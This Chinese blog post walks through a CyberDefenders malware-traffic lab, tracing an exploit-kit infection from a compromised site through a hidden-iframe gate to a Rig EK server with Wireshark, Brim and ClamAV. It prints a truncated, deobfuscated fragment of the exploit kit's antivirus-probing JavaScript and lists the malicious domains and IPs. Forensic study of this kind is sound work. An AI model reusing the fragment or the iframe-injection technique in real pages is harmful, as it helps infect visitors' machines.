<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Bantian">





<title>流量分析系列之Malware-Traffic-下 | Bantian</title>



    <link rel="icon" href="/my.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">流量分析系列之Malware-Traffic-下</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">2021-08-01&nbsp;&nbsp;12:53:57</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <blockquote>
<p>本文首发在安全客：<a href="https://www.anquanke.com/post/id/244154，分为两部分，本文为下" target="_blank" rel="noopener">https://www.anquanke.com/post/id/244154，分为两部分，本文为下</a></p>
</blockquote>
<h2 id="Malware-Traffic-Analysis-2"><a href="#Malware-Traffic-Analysis-2" class="headerlink" title="Malware Traffic Analysis-2"></a>Malware Traffic Analysis-2</h2><p>lab地址：<a href="https://cyberdefenders.org/labs/17" target="_blank" rel="noopener">https://cyberdefenders.org/labs/17</a></p>
<p>这道题没什么场景，一上来就给了一个pcap数据包，以及几个问题，直接开始分析！</p>
<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><h3 id="Problem-1"><a href="#Problem-1" class="headerlink" title="Problem 1"></a>Problem 1</h3><blockquote>
<p>*<em>What is the IP address of the Windows VM that gets infected? *</em></p>
</blockquote>
<p>首先，第一道题就是求被感染主机的IP。在没有任何场景提示的情况下，一拿到流量包就要分析，还是先送到VirusTotal上扫描，扫描结果显示这个数据包还是有点东西的，其中包括11条Snort alerts和23条Suricata alerts：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/1.png" alt="1"></p>
<p>查看更详细的分析，看来受害主机是被Exploit-Kit感染了的：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/2.png" alt="2"></p>
<p>既然存在木马文件，那么拖入数据包分析神器Brim看看。拖入Brim后，发现有很多files：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/3.png" alt="3"></p>
<p>很容易就和Exploit-Kit联系起来，过滤出所有files流量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_path&#x3D;files</span><br></pre></td></tr></table></figure>

<p>所以的destination ip全是<code>172.16.165.165</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/4.png" alt="4"></p>
<p>在wireshark中进行过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/5.png" alt="5"></p>
<p>数据包源IP地址都是<code>172.16.165.165</code>。也可以过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.response</span><br></pre></td></tr></table></figure>

<p>得到的结果也在预料之中，目的地址都是<code>172.16.165.165</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/6.png" alt="6"></p>
<p>得到本题答案：受害主机IP为<code>172.16.165.165</code>。</p>
<h3 id="Problem-2"><a href="#Problem-2" class="headerlink" title="Problem 2"></a>Problem 2</h3><blockquote>
<p>*<em>What is the hostname of the Windows VM that gets infected? *</em></p>
</blockquote>
<p>查找主机名只要过滤出dhcp流量即可，我们选择第一条源地址为受害主机的dhcp流量：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/7.png" alt="7"></p>
<p>很容易得到主机名为<code>K34EN6W3N-PC</code>。当然，因为是Windows主机，还可以过滤<code>nbns</code>流量来获取主机名：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/8.png" alt="8"></p>
<h3 id="Problem-3"><a href="#Problem-3" class="headerlink" title="Problem 3"></a>Problem 3</h3><blockquote>
<p>*<em>What is the MAC address of the infected VM? *</em></p>
</blockquote>
<p>求受害主机的MAC地址很简单，只要和受害主机IP相关的流量中都能提取出该条信息，比如我们过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip.src&#x3D;&#x3D;172.16.165.165</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/9.png" alt="9"></p>
<p>当然，也可以过滤ARP流量，查看发起ARP广播的相关信息：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/27.png" alt="27"></p>
<p>得到本题答案：受害主机MAC地址为：<code>f0:19:af:02:9b:f1</code>。</p>
<h3 id="Problem-4"><a href="#Problem-4" class="headerlink" title="Problem 4"></a>Problem 4</h3><blockquote>
<p>*<em>What is the IP address of the compromised web site? *</em></p>
</blockquote>
<p>从VirusTotal的扫描结果看，受害主机是在网上冲浪时被感染了Exploit-Kit，但是具体是怎么感染的我们还不清楚。但是从受害主机发出的http请求中，我们大概可以得到compromised website的候选站点：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/10.png" alt="10"></p>
<p>分别是：</p>
<table>
<thead>
<tr>
<th align="center">IP</th>
<th align="center">Host</th>
</tr>
</thead>
<tbody><tr>
<td align="center">82.150.140.30</td>
<td align="center"><a href="http://www.ciniholland.nl" target="_blank" rel="noopener">www.ciniholland.nl</a></td>
</tr>
<tr>
<td align="center">185.53.178.9</td>
<td align="center">adultbiz.in</td>
</tr>
<tr>
<td align="center">188.225.73.100</td>
<td align="center">24corp-shop.com</td>
</tr>
<tr>
<td align="center">37.200.69.143</td>
<td align="center">stand.trustandprobaterealty.com</td>
</tr>
</tbody></table>
<p>我们先从流量包中提取出恶意软件，选择<code>File-&gt;Export Objects-&gt;HTTP</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/23.png" alt="23"></p>
<p>选择<code>Save All</code>将这些文件全部提取保存在文件夹中，然后一起拖入扫描软件Clam中检查：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/22.png" alt="22"></p>
<p>从该流量包中提取出了37个文件，经过Clam扫描，发现了4个恶意软件，分别选择上面的四个文件，然后选择<code>Analysis</code>选项，就能逐个得到可以的源文件。最后发现是这4个可疑文件被扫描出：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">index.php%3freq&#x3D;swf&amp;num&#x3D;809&amp;PHPSSESID&#x3D;njrMNruDMhvJFIPGKuXDSKVbM07PThnJko2ahe6JVg%7cZDJiZjZiZjI5Yzc5OTg3MzE1MzJkMmExN2M4NmJiOTM</span><br><span class="line"></span><br><span class="line">index.php%3freq&#x3D;swf&amp;num&#x3D;7533&amp;PHPSSESID&#x3D;njrMNruDMhvJFIPGKuXDSKVbM07PThnJko2ahe6JVg%7cZDJiZjZiZjI5Yzc5OTg3MzE1MzJkMmExN2M4NmJiOTM</span><br><span class="line"></span><br><span class="line">index.php%3freq&#x3D;jar&amp;num&#x3D;3703&amp;PHPSSESID&#x3D;njrMNruDMhvJFIPGKuXDSKVbM07PThnJko2ahe6JVg%7CZDJiZjZiZjI5Yzc5OTg3MzE1MzJkMmExN2M4NmJiOTM</span><br><span class="line"></span><br><span class="line">index.php%3freq&#x3D;jar&amp;num&#x3D;9229&amp;PHPSSESID&#x3D;njrMNruDMhvJFIPGKuXDSKVbM07PThnJko2ahe6JVg%7CZDJiZjZiZjI5Yzc5OTg3MzE1MzJkMmExN2M4NmJiOTM</span><br></pre></td></tr></table></figure>

<p>从中提取出关键信息：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">req&#x3D;swf&amp;num&#x3D;809</span><br><span class="line">req&#x3D;swf&amp;num&#x3D;7533</span><br><span class="line">req&#x3D;jar&amp;num&#x3D;3703</span><br><span class="line">req&#x3D;jar&amp;num&#x3D;9229</span><br></pre></td></tr></table></figure>

<p>虽然不清楚这几串请求中<code>num</code>参数带的数字是什么意义，但是至少我们可以知道malware的格式分别为是swf格式的flash文件和jar包：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/13.png" alt="13"></p>
<p>接着从中过滤出与这四条请求相关的http流量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip contains &quot;req&#x3D;swf&amp;num&#x3D;809&quot; or ip contains &quot;req&#x3D;swf&amp;num&#x3D;7533&quot; or ip contains &quot;req&#x3D;jar&amp;num&#x3D;3703&quot; or ip contains &quot;req&#x3D;jar&amp;num&#x3D;9229&quot;</span><br></pre></td></tr></table></figure>

<p>顺利返回4条记录，这4条记录的目的地址IP都是<code>37.200.69.143</code>，对应域名为<code>stand.trustandprobaterealty.com</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/11.png" alt="11"></p>
<p>由此我们可以知道，提供感染受害主机的Exploit-Kit是由主机<code>stand.trustandprobaterealty.com</code>提供的，它就是Exploit-Kit感染链中的提供EK的主机<strong>EK server</strong>。</p>
<p>现在我们找到了攻击链中的最后一个设备<strong>EK server</strong>，不过本题需要找的是攻击链中的第一环节，即<strong>Compromised website</strong>。</p>
<p>当然我们还不知道这中间是不是存在一些gate traffic。不过在一般场景中，攻击链无非是：</p>
<blockquote>
<p><strong><em>Compromised(legitimate) website –&gt; EK server</em></strong></p>
<p><strong><em>Compromised website –&gt; Gate –&gt; EK</em></strong></p>
<p><strong><em>Compromised website –&gt; First gate –&gt; Second gate –&gt; EK</em></strong></p>
<p><strong><em>Compromised website –&gt; First gate –&gt; Second gate –&gt; n… gate –&gt; EK</em></strong></p>
</blockquote>
<p>我一开始的想法是看看EK server是不是还存在于其他主机与受害主机的通讯流量中，所以进行过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip contains stand.trustandprobaterealty.com</span><br></pre></td></tr></table></figure>

<p>但是返回的结果表明该domain仅在受害主机和EK server之间的流量中存在：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/12.png" alt="12"></p>
<p>没关系，前面我们过滤出4条与Exploit-Kit和malware相关的流量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip contains &quot;req&#x3D;swf&amp;num&#x3D;809&quot; or ip contains &quot;req&#x3D;swf&amp;num&#x3D;7533&quot; or ip contains &quot;req&#x3D;jar&amp;num&#x3D;3703&quot; or ip contains &quot;req&#x3D;jar&amp;num&#x3D;9229&quot;</span><br></pre></td></tr></table></figure>

<p>右键追踪HTTP流，在受害主机向EK server（<code>stand.trustandprobaterealty.com</code>）的HTTP请求包中，数据包请求头header中的<code>Referer</code>字段是<code>http://24corp-shop.com</code>，4个受害主机向EK server请求恶意软件的请求数据包的header中都包含相同的Referer字段（当然受害者自己本人大概率是不知道的，除非他要已经知道恶意站点的情况，只是进行研究）：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/14.png" alt="14"></p>
<p>所以我们知道了在EK server之前的gate是<code>24corp-shop.com</code>，对应IP为<code>188.225.73.100</code>。我们得到的额外信息是，在EK server返回的响应包中，恶意数据是通过<code>gzip</code>的格式传输的。</p>
<p>攻击链更新为：</p>
<blockquote>
<p><strong><em>unknown Compromised website –&gt; … gate –&gt; gate [24corp-shop.com] –&gt; EK server [stand.trustandprobaterealty.com]</em></strong></p>
</blockquote>
<p>过滤出<code>24corp-shop.com</code>相关的http流量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request and ip.addr&#x3D;&#x3D;188.225.73.100</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/16.png" alt="16"></p>
<p>右键跟踪HTTP流，该请求数据包请求头中<code>Referer</code>字段为<code>http://www.ciniholland.nl</code>，对应IP为<code>82.150.140.30</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/15.png" alt="15"></p>
<p>并且gate搭建了一个假的页面来欺骗访问的用户，采用的攻击方法是iframe劫持。</p>
<p>继续向前追溯，过滤与<code>www.ciniholland.nl</code>相关的http请求：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request and ip.addr&#x3D;&#x3D;82.150.140.30</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/17.png" alt="17"></p>
<p>选择第一条请求主站点的数据流，追踪数据流：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/18.png" alt="18"></p>
<p>我们看到，同样是利用frame劫持的手段，不过该隐形iframe是通过js写入的，当文档被完全加载和解析后，就会执行<code>showBrowVer()</code>函数，该函数会创建一个<code>div</code>标签，然后在该标签中写入iframe，将用户重定向至gate服务器，而且为了防止此处执行<code>showBrowVer()</code>失败，攻击者在页面的最后也放了相同的函数来保证用户能够被重定向至恶意软件所在的服务器：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/19.png" alt="19"></p>
<p>而且从该条流量我们也能够发现，<code>Referer</code>字段为<code>http://www.bing.com/search?q=ciniholland.nl&amp;qs=ds&amp;form=QBLH</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/20.png" alt="20"></p>
<p>到这里，整个流量指向的事件已经很清楚了，是受害主机的用户在<a href="http://www.biying.com" target="_blank" rel="noopener">www.biying.com</a> 上搜索到了一个受攻击者感染的网站，并且访问了该网站，然后该网站通过frame劫持将受害者用户重定向至<code>24corp-shop.com</code>，在这个充当gate的站点中，同样存在一个不可见的iframe将用户重定向至Exploit Kit和malware存在的站点<code>stand.trustandprobaterealty.com</code>，所以整个访问过程为：</p>
<blockquote>
<p><strong><em>Compromised website [<a href="http://www.ciniholland.nl]">www.ciniholland.nl]</a> –&gt; gate [24corp-shop.com] –&gt; EK server [stand.trustandprobaterealty.com]</em></strong></p>
</blockquote>
<p>用IP地址来表示为：</p>
<blockquote>
<p><strong><em>82.150.140.30 –&gt; 188.225.73.100  –&gt; 37.200.69.143</em></strong></p>
</blockquote>
<p>我们得到本题的答案：<code>82.150.140.30</code>。</p>
<h3 id="Problem-5"><a href="#Problem-5" class="headerlink" title="Problem 5"></a>Problem 5</h3><blockquote>
<p>*<em>What is the FQDN of the compromised website? *</em></p>
</blockquote>
<p>上一道题已经分析过，compromised website的完全限定域名为<code>ciniholland.nl</code>。</p>
<h3 id="Problem-6"><a href="#Problem-6" class="headerlink" title="Problem 6"></a>Problem 6</h3><blockquote>
<p>*<em>What is the IP address of the server that delivered the exploit kit and malware? *</em></p>
</blockquote>
<p>本题求提供Exploit-Kit和malware的主机，前面第4题已经分析过了，本题答案为<code>37.200.69.143</code>。</p>
<h3 id="Problem-7"><a href="#Problem-7" class="headerlink" title="Problem 7"></a>Problem 7</h3><blockquote>
<p>*<em>What is the FQDN that delivered the exploit kit and malware? *</em></p>
</blockquote>
<p>求EK server的完全限定域名，答案为<code>stand.trustandprobaterealty.com</code>。</p>
<h3 id="Problem-8"><a href="#Problem-8" class="headerlink" title="Problem 8"></a>Problem 8</h3><blockquote>
<p>*<em>What is the redirect URL that points to the exploit kit (EK) landing page? *</em></p>
</blockquote>
<p>前面分析过，对<code>http://24corp-shop.com/</code>相关的http流量追踪流，就能发现该页面中包含的iframe会加载EK服务器上的页面：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/21.png" alt="21"></p>
<p>本题答案为： <a href="http://24corp-shop.com/" target="_blank" rel="noopener">http://24corp-shop.com/</a>  。</p>
<h3 id="Problem-9"><a href="#Problem-9" class="headerlink" title="Problem 9"></a>Problem 9</h3><blockquote>
<p>*<em>Other than CVE-2013-2551 IE exploit, another application was targeted by the EK and starts with “J”. Provide the full application name. *</em></p>
</blockquote>
<p>在Clam中的扫描结果显示，从流量包中提取出的37个文件中包含4个malware：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/24.png" alt="24"></p>
<p>其中<code>Swf.Exploit.Rig</code>属于Rig组件，对应<code>CVE-2013-2551</code>：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/25.png" alt="25"></p>
<p>那剩余的自然是malware自然是打包后的jar包，因此本题答案为：<code>Java</code>。</p>
<h3 id="Problem-10"><a href="#Problem-10" class="headerlink" title="Problem 10"></a>Problem 10</h3><blockquote>
<p>*<em>How many times was the payload delivered? *</em></p>
</blockquote>
<p>本题的问题是，payload一共被传递了几次？也就是EK server一共向受害主机发送了几次payload，过滤出EK server向受害主机发送的http流量：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.response and ip.src eq 37.200.69.143</span><br></pre></td></tr></table></figure>

<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/28.png" alt="28"></p>
<p>其中有一种类型为<code>x-msdownload</code>，google之后，发现该MIME类型通常是表示一个dll类型：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/29.png" alt="29"></p>
<p>而且，追踪该条数据流，我们发现了</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/30.png" alt="30"></p>
<p>这显然是混淆后的代码，在<a href="https://lelinhtinh.github.io/de4js/" target="_blank" rel="noopener">https://lelinhtinh.github.io/de4js/</a> 简单地反混淆后，得到：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> as4442 = <span class="string">"asd5645fsdfs6201042433028275342403746df"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">uffe45</span>(<span class="params">txt</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> gf541 = <span class="keyword">new</span> ActiveXObject(<span class="string">"Micros"</span> + <span class="string">"oft.XM"</span> + <span class="string">"LDOM"</span>);</span><br><span class="line">    gf541.async = <span class="literal">true</span>;</span><br><span class="line">    gf541.loadXML(<span class="string">'&lt;!DOCT'</span> + <span class="string">'YPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "res://'</span> + txt + <span class="string">'"&gt;'</span>);</span><br><span class="line">    <span class="keyword">if</span> (gf541.parseError.errorCode != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> err = <span class="string">"Error Code: "</span> + gf541.parseError.errorCode + <span class="string">"\ n"</span>;</span><br><span class="line">        err += <span class="string">"Error Reason: "</span> + gf541.parseError.reason;</span><br><span class="line">        err += <span class="string">"Error Line: "</span> + gf541.parseError.line;</span><br><span class="line">        <span class="keyword">if</span> (err.indexOf(<span class="string">"-2147023083"</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> as71 = <span class="string">"asdddsd76fsfs9840944044952441332557df"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">gr34s</span>(<span class="params">ygr</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> yre23 = <span class="keyword">new</span> <span class="built_in">Date</span>().getTime(),</span><br><span class="line">        c = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (c) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="built_in">Date</span>().getTime() - yre23) &gt; ygr) &#123;</span><br><span class="line">            c = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> l = <span class="number">0</span>; l &lt; <span class="number">50</span>; l++) &#123;</span><br><span class="line">    asfgsdg = <span class="string">"c:\\wi"</span> + <span class="string">"ndows\\syst"</span> + <span class="string">"em32\\drive"</span> + <span class="string">"rs\\tmac"</span> + <span class="string">"tmon.sys"</span>;</span><br><span class="line">    asfhj65 = <span class="string">"c:\\win"</span> + <span class="string">"dows\\syste"</span> + <span class="string">"m32\\driv"</span> + <span class="string">"ers\\tmco"</span> + <span class="string">"mm.sys"</span>;</span><br><span class="line">    bsdfdfg = <span class="string">"c:\\wind"</span> + <span class="string">"ows\\syste"</span> + <span class="string">"m32\\driver"</span> + <span class="string">"s\\tmev"</span> + <span class="string">"tmgr.sys"</span>;</span><br><span class="line">    dfgdfgq = <span class="string">"c:\\win"</span> + <span class="string">"dows\\system"</span> + <span class="string">"32\\drive"</span> + <span class="string">"rs\\TME"</span> + <span class="string">"BC32.sys"</span>;</span><br><span class="line">    sdfsdhj = <span class="string">"c:\\wind"</span> + <span class="string">"ows\\system32\\dr"</span> + <span class="string">"ivers\\tmee"</span> + <span class="string">"xt.sys"</span>;</span><br><span class="line">    fdg565f = <span class="string">"c:\\windo"</span> + <span class="string">"ws\\syst"</span> + <span class="string">"em32\\dri"</span> + <span class="string">"vers\\tmnc"</span> + <span class="string">"iesc.sys"</span>;</span><br><span class="line">    dfgdhfg = <span class="string">"c:\\win"</span> + <span class="string">"dows\\system32\\dr"</span> + <span class="string">"ivers\\tmtdi"</span> + <span class="string">".sys"</span>;</span><br><span class="line">    vsdfsdf = <span class="string">"c:\\win"</span> + <span class="string">"dows\\sy"</span> + <span class="string">"stem32\\drivers\\ea"</span> + <span class="string">"mon.sys"</span>;</span><br><span class="line">    fdtfsdf = <span class="string">"c:\\windows\\sys"</span> + <span class="string">"tem32\\drivers\\kli"</span> + <span class="string">"f.sys"</span>;</span><br><span class="line">    uyuyrew = <span class="string">"c:\\win"</span> + <span class="string">"dows\\system32\\dr"</span> + <span class="string">"ivers\\kn"</span> + <span class="string">"eps.sys"</span>;</span><br><span class="line">    rt5644s = <span class="string">"c:\\windows\\system32\\drivers\\kl"</span> + <span class="string">"flt.sys"</span>;</span><br><span class="line">    a76f64s = <span class="string">"c:\\wind"</span> + <span class="string">"ows\\syst"</span> + <span class="string">"em32\\dr"</span> + <span class="string">"ivers\\klfl"</span> + <span class="string">"t.sys"</span>;</span><br><span class="line">    <span class="keyword">if</span> (uffe45(asfgsdg) || uffe45(asfhj65) || uffe45(bsdfdfg) || uffe45(dfgdfgq) || uffe45(sdfsdhj) || uffe45(fdg565f) || uffe45(dfgdhfg) || uffe45(vsdfsdf) || uffe45(fdtfsdf) || uffe45(uyuyrew) || uffe45(rt5644s) || uffe45(a76f64s)) &#123;</span><br><span class="line">        <span class="built_in">window</span>.g565fss = <span class="literal">true</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    gr34s(<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.g565fss != <span class="literal">true</span>) &#123;</span><br><span class="line">    b67da = <span class="built_in">String</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">......</span><br></pre></td></tr></table></figure>

<p>看来该流量确实是用来传递恶意payload的，所以本题的答案为：<code>3</code>次。</p>
<h3 id="Problem-11"><a href="#Problem-11" class="headerlink" title="Problem 11"></a>Problem 11</h3><blockquote>
<p>*<em>The compromised website has a malicious script with a URL. What is this URL? *</em></p>
</blockquote>
<p>这道题和前面的问题其实有点重复，过滤：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http.request and ip.addr&#x3D;&#x3D;82.150.140.30</span><br></pre></td></tr></table></figure>

<p>选择第一条数据并追踪http流：</p>
<p><img src="/2021/08/01/MalwareTrafficAnalysis2/imgs/26.png" alt="26"></p>
<p>答案为<code>http://24corp-shop.com/</code>。</p>
<p>这其实是一种常见的感染方式，称为<strong>js malware hidden-iframe</strong>，可以参考这篇文章：</p>
<blockquote>
<p> <a href="https://labs.sucuri.net/signatures/malwares/js-malware-hidden-iframe-006/" target="_blank" rel="noopener">https://labs.sucuri.net/signatures/malwares/js-malware-hidden-iframe-006/</a></p>
</blockquote>
<p>hidden-iframe是很常见的一种引导用户下载恶意软件的方式。在受攻击者感染的站点页面中加入一个用户看不见的iframe，而该iframe会从第三方站点加载恶意文件，在用户毫无察觉的情况下感染他们的计算机。但是iframe代码本身是很简单的，所以稍有经验的管理员就能够发现不属于本站点的iframe存在。因此在很多情况下，攻击者会对通过js代码来注入iframe。并且在更多的时候，攻击者会对JS进行处理，比如对js代码进行混淆，这样网站管理员就很难读懂这串代码的真实意图是什么。</p>
<p>第一种常见的方法就是本题中使用的技术，不过这很容易被网站管理员发现：</p>
